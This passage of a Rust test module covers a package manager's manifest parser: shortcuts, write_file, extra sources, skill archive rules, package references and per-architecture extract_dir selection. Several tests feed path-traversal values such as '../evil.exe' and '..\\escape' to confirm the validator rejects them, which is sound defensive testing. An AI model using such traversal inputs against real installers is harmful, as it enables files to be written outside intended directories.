            minimal(r#"shortcuts = ["myapp.exe", { target = "sub/tool.exe", name = "My Tool" }]"#);
        let m = Manifest::from_toml_str(&s).expect("shortcuts should parse");
        assert_eq!(m.shortcuts.len(), 2);
        assert_eq!(m.shortcuts[0].target(), "myapp.exe");
        assert_eq!(m.shortcuts[0].link_name(), "myapp");
        assert_eq!(m.shortcuts[1].target(), "sub/tool.exe");
        assert_eq!(m.shortcuts[1].link_name(), "My Tool");
    }

    #[test]
    fn rejects_shortcut_traversal() {
        let s = minimal(r#"shortcuts = ["../evil.exe"]"#);
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::RelativePath { .. })
        ));
    }

    #[test]
    fn parses_write_file() {
        let s = minimal(
            r#"write_file = [{ path = "portable.ini", content = "[settings]\nportable=true" }]"#,
        );
        let m = Manifest::from_toml_str(&s).expect("write_file should parse");
        assert_eq!(m.write_file.len(), 1);
        assert_eq!(m.write_file[0].path, "portable.ini");
    }

    #[test]
    fn rejects_write_file_traversal() {
        let s = minimal(r#"write_file = [{ path = "../evil.ini", content = "x" }]"#);
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::RelativePath { .. })
        ));
    }

    #[test]
    fn parses_extra_sources() {
        let s = format!(
            r#"
name = "app"
version = "1.0.0"
kind = "app"
[source.x64]
url = "https://example.com/a.zip"
sha256 = "{}"
extra = [{{ url = "https://example.com/b.zip", sha256 = "{}", extract_to = "plugins" }}]
"#,
            "a".repeat(64),
            "b".repeat(64)
        );
        let m = Manifest::from_toml_str(&s).expect("extra sources should parse");
        let src = m.source.x64.as_ref().unwrap();
        assert_eq!(src.extra.len(), 1);
        assert_eq!(src.extra[0].extract_to, "plugins");
    }

    #[test]
    fn rejects_extra_extract_to_traversal() {
        let s = format!(
            r#"
name = "app"
version = "1.0.0"
kind = "app"
[source.x64]
url = "https://example.com/a.zip"
sha256 = "{}"
extra = [{{ url = "https://example.com/b.zip", sha256 = "{}", extract_to = "../escape" }}]
"#,
            "a".repeat(64),
            "b".repeat(64)
        );
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::RelativePath { .. })
        ));
    }

    #[test]
    fn standard_skill_archive_parses_without_extra_schema() {
        let s = format!(
            r#"
name = "tdd"
version = "1.0.0"
description = "Test-driven development workflow"
kind = "skill"

[source.any]
url = "https://example.com/tdd.zip"
sha256 = "{}"
"#,
            "a".repeat(64)
        );
        let skill = Manifest::from_toml_str(&s).expect("standard skill archive should parse");
        assert_eq!(skill.kind, Kind::Skill);
        assert!(skill.bin.is_empty());
        assert!(!toml::to_string(&skill).unwrap().contains("[skill]"));
    }

    #[test]
    fn skill_manifest_enforces_name_and_archive_shape_early() {
        let long_name = "a".repeat(65);
        for name in ["-tdd", "tdd-", "test--driven", long_name.as_str()] {
            let text = format!(
                r#"
name = "{name}"
version = "1.0.0"
kind = "skill"

[source.any]
url = "https://example.com/tdd.zip"
sha256 = "{}"
"#,
                "a".repeat(64)
            );
            assert!(matches!(
                Manifest::from_toml_str(&text),
                Err(ManifestError::SkillName(_))
            ));
        }

        let extensionless = format!(
            r#"
name = "tdd"
version = "1.0.0"
kind = "skill"

[source.any]
url = "https://example.com/download"
sha256 = "{}"
"#,
            "a".repeat(64)
        );
        assert!(matches!(
            Manifest::from_toml_str(&extensionless),
            Err(ManifestError::SkillArchiveUrl(_))
        ));
    }

    #[test]
    fn skill_rejects_app_only_fields() {
        for (field, extra) in [
            ("extract_dir", r#"extract_dir = "wrapped""#),
            ("bin", r#"bin = ["tool.exe"]"#),
            ("env", r#"env = { PATH = "{dir}" }"#),
            ("depends", r#"depends = { app = "*" }"#),
            ("persist", r#"persist = ["config"]"#),
            ("gui", "gui = false"),
            ("shortcuts", r#"shortcuts = ["tool.exe"]"#),
            (
                "write_file",
                r#"write_file = [{ path = "config", content = "x" }]"#,
            ),
        ] {
            let s = format!(
                r#"
name = "tdd"
version = "1.0.0"
kind = "skill"
{extra}

[source.any]
url = "https://example.com/tdd.zip"
sha256 = "{}"
"#,
                "a".repeat(64)
            );
            assert!(matches!(
                Manifest::from_toml_str(&s),
                Err(ManifestError::SkillField(actual)) if actual == field
            ));
        }
    }

    #[test]
    fn skill_rejects_nonstandard_source_features() {
        let s = format!(
            r#"
name = "tdd"
version = "1.0.0"
kind = "skill"

[source.any]
url = "https://example.com/tdd.exe"
sha256 = "{}"
kind = "installer-archive"
"#,
            "a".repeat(64)
        );
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::SkillField("source.kind"))
        ));
    }

    #[test]
    fn universal_source_is_skill_only() {
        let app = minimal("").replace("[source.x64]", "[source.any]");
        assert!(matches!(
            Manifest::from_toml_str(&app),
            Err(ManifestError::UniversalSource)
        ));

        let skill = minimal("")
            .replace(r#"kind = "app""#, r#"kind = "skill""#)
            .replace("[source.x64]", "[source.any]");
        Manifest::from_toml_str(&skill).expect("skill accepts a universal source");

        let arch_skill = minimal("").replace(r#"kind = "app""#, r#"kind = "skill""#);
        assert!(matches!(
            Manifest::from_toml_str(&arch_skill),
            Err(ManifestError::SkillSource)
        ));
    }

    #[test]
    fn package_refs_are_qualified_without_weakening_manifest_names() {
        assert_eq!(
            PackageRef::parse("foo").unwrap(),
            PackageRef {
                kind: Kind::App,
                name: "foo".to_string(),
            }
        );
        assert_eq!(PackageRef::parse("app/foo").unwrap().kind, Kind::App);
        assert_eq!(PackageRef::parse("mcp/foo").unwrap().kind, Kind::Mcp);
        assert_eq!(PackageRef::parse("skill/foo").unwrap().kind, Kind::Skill);
        assert!(matches!(
            PackageRef::parse("skill/foo/bar"),
            Err(PackageRefError::Name(name)) if name == "foo/bar"
        ));
        assert!(matches!(
            PackageRef::parse("other/foo"),
            Err(PackageRefError::Kind(kind)) if kind == "other"
        ));
        assert!(matches!(
            Manifest::from_toml_str(&minimal("").replace("name = \"app\"", "name = \"app/foo\"")),
            Err(ManifestError::Name(name)) if name == "app/foo"
        ));
    }

    // --- per-arch extract_dir + architecture selection --------------------

    /// A dual-arch manifest. `top` goes next to the other top-level scalars;
    /// `x64_extra` / `arm64_extra` go inside the matching `[source.<arch>]`.
    fn dual(top: &str, x64_extra: &str, arm64_extra: &str) -> String {
        format!(
            r#"
name = "app"
version = "1.0.0"
kind = "app"
{top}

[source.x64]
url = "https://example.com/a-x64.zip"
sha256 = "{a}"
{x64_extra}

[source.arm64]
url = "https://example.com/a-arm64.zip"
sha256 = "{b}"
{arm64_extra}
"#,
            a = "a".repeat(64),
            b = "b".repeat(64),
        )
    }

    #[test]
    fn per_arch_extract_dir_overrides_the_top_level_one() {
        let m = Manifest::from_toml_str(&dual(
            r#"extract_dir = "app-x86_64-windows""#,
            "",
            r#"extract_dir = "app-aarch64-windows""#,
        ))
        .expect("a per-arch extract_dir is valid");

        let x64 = m.source.x64.as_ref().unwrap();
        let arm64 = m.source.arm64.as_ref().unwrap();
        // Absent on x64 -> the top-level value; present on arm64 -> the override.
        assert_eq!(m.extract_dir_for(x64), Some("app-x86_64-windows"));
        assert_eq!(m.extract_dir_for(arm64), Some("app-aarch64-windows"));

        // No top-level field at all: the override still applies, and the arch
        // without one strips nothing.
        let m = Manifest::from_toml_str(&dual("", "", r#"extract_dir = "wrapper""#)).unwrap();
        assert_eq!(m.extract_dir_for(m.source.x64.as_ref().unwrap()), None);
        assert_eq!(
            m.extract_dir_for(m.source.arm64.as_ref().unwrap()),
            Some("wrapper")
        );
    }

    /// The override lands on the filesystem exactly like the top-level field, so
    /// it gets the same validator — absolute paths, `..`, drive prefixes and
    /// reserved device names are all rejected.
    #[test]
    fn per_arch_extract_dir_is_validated_like_the_top_level_field() {
        for bad in [
            "C:\\windows",
            "/abs",
            "\\abs",
            "..\\escape",
            "wrapper\\..\\..\\escape",
            "nul",
        ] {
            let toml = dual("", "", &format!("extract_dir = {}", esc(bad)));
            assert!(
                matches!(
                    Manifest::from_toml_str(&toml),
                    Err(ManifestError::RelativePath {
                        field: "extract_dir",
                        ..
                    })
                ),
                "per-arch extract_dir {bad:?} must be rejected"
            );
        }
        // Still meaningless on a binary source, per-arch as well as top-level.
        let toml = binary(r#"file_name = "jq.exe""#, "https://example.com/jq.exe").replace(
            "kind = \"binary\"",
            "kind = \"binary\"\nextract_dir = \"w\"",
        );
        assert!(matches!(
            Manifest::from_toml_str(&toml),
            Err(ManifestError::BinaryField("extract_dir"))
        ));
    }

    #[test]
    fn per_arch_extract_dir_round_trips_canonically() {
        let m = Manifest::from_toml_str(&dual(
            r#"extract_dir = "app-x86_64-windows""#,
            "",
            r#"extract_dir = "app-aarch64-windows""#,
        ))
        .unwrap();
        let text = m.to_canonical_toml();
        assert!(
            text.contains("[source.arm64]\nurl = \"https://example.com/a-arm64.zip\"\nsha256 = \"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\"\nextract_dir = \"app-aarch64-windows\"\n"),
            "per-arch extract_dir must be emitted inside its own source block:\n{text}"
        );
        assert_eq!(Manifest::from_toml_str(&text).unwrap(), m);
        assert!(m.is_canonical_toml(&text));
    }

    /// The regression guard for the 145 dual-arch manifests that carry a
    /// top-level `extract_dir` (83 of them with an arch token literally in the
    /// string): an arm64 host must NOT pick the arm64 source unless picking it is
    /// provably safe, because a wrong `extract_dir` fails only after a full
    /// download.
    #[test]
    fn arch_selection_prefers_the_host_but_only_when_it_is_safe() {
        // x64 host: always the x64 source, top-level extract_dir or not.
        for toml in [
            dual("", "", ""),
            dual(r#"extract_dir = "app-x86_64-windows""#, "", ""),
        ] {
            let m = Manifest::from_toml_str(&toml).unwrap();
            let picked = m.select_source(Arch::X64).unwrap();
            assert_eq!(picked.arch, Arch::X64);
            assert_eq!(picked.fallback, None);
            assert_eq!(picked.source, m.source.x64.as_ref().unwrap());
        }

        // arm64 host, safe: no top-level extract_dir to mis-strip.
        let m = Manifest::from_toml_str(&dual("", "", "")).unwrap();
        let picked = m.select_source(Arch::Arm64).unwrap();
        assert_eq!(picked.arch, Arch::Arm64);
        assert_eq!(picked.fallback, None);

        // arm64 host, safe: the arm64 source brings its own extract_dir.
        let m = Manifest::from_toml_str(&dual(
            r#"extract_dir = "app-x86_64-windows""#,
            "",
            r#"extract_dir = "app-aarch64-windows""#,
        ))
        .unwrap();
        let picked = m.select_source(Arch::Arm64).unwrap();
        assert_eq!(picked.arch, Arch::Arm64);
        assert_eq!(picked.fallback, None);

        // arm64 host, UNSAFE: top-level extract_dir, no per-arch override. Fall
        // back to the emulated x64 build rather than fail after downloading.
        let m = Manifest::from_toml_str(&dual(r#"extract_dir = "app-x86_64-windows""#, "", ""))
            .unwrap();
        let picked = m.select_source(Arch::Arm64).unwrap();
        assert_eq!(picked.arch, Arch::X64);
        assert_eq!(picked.fallback, Some(ArchFallback::ExtractDir));
        assert_eq!(picked.source, m.source.x64.as_ref().unwrap());
    }

    #[test]
    fn a_missing_host_arch_falls_back_and_says_so() {
        // arm64-only manifest on an x64 host: use arm64 and report the fallback.
        let arm64_only = minimal("").replace("[source.x64]", "[source.arm64]");
        let m = Manifest::from_toml_str(&arm64_only).unwrap();
        let picked = m.select_source(Arch::X64).unwrap();
        assert_eq!(picked.arch, Arch::Arm64);
        assert_eq!(picked.fallback, Some(ArchFallback::Missing));

        // x64-only manifest on an arm64 host: the ordinary emulated install.
        let m = Manifest::from_toml_str(&minimal("")).unwrap();
        let picked = m.select_source(Arch::Arm64).unwrap();
        assert_eq!(picked.arch, Arch::X64);
        assert_eq!(picked.fallback, Some(ArchFallback::Missing));

        // A single-arch manifest's top-level extract_dir describes THAT arch by
        // construction, so it is not treated as a mis-strip risk.
        let m = Manifest::from_toml_str(
            &minimal(r#"extract_dir = "app-aarch64-windows""#)
                .replace("[source.x64]", "[source.arm64]"),
        )
        .unwrap();
        let picked = m.select_source(Arch::Arm64).unwrap();
        assert_eq!(picked.arch, Arch::Arm64);
        assert_eq!(picked.fallback, None);

        // Skills carry [source.any] only — neither arch is selectable.
        let skill = minimal("")
            .replace(r#"kind = "app""#, r#"kind = "skill""#)
            .replace("[source.x64]", "[source.any]");
        let m = Manifest::from_toml_str(&skill).unwrap();
        assert!(m.select_source(Arch::X64).is_none());
    }
}
